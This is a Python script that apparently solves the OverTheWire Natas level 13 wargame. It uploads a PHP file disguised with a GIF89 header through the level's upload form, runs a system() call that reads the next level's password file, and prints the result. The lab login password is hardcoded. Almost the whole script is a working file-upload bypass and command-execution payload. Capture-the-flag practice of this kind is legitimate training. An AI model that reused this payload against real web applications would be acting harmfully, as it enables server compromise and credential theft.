import requests
import re

def flag(url,username,password,file):
    site = requests.get(url + file[0],auth=(username,password))
    print("The flag for natas13 is: " + site.text.strip().replace("GIF89;",""))

def upload(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    payload = 'GIF89;<? system("cat /etc/natas_webpass/natas14"); ?>'
    file_data = {
            "MAX_FILE_SIZE":"1000",
            "filename":"test.php",
            }
    file_upload = {
            "uploadedfile":("evil.php",payload,{"Content-Type":"application/x-php","Content-Disposition":"form-data"})
            }
    get_file = requests.post(url + "index.php",data=file_data, files=file_upload,auth=(username,password))
    file = re.findall('The file <a href="(.*)">upload',get_file.text)
    flag(url,username,password,file)

if __name__=="__main__":
    url = "http://natas13.natas.labs.overthewire.org/"
    username = "natas13"
    password = "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9"
    upload(url,username,password)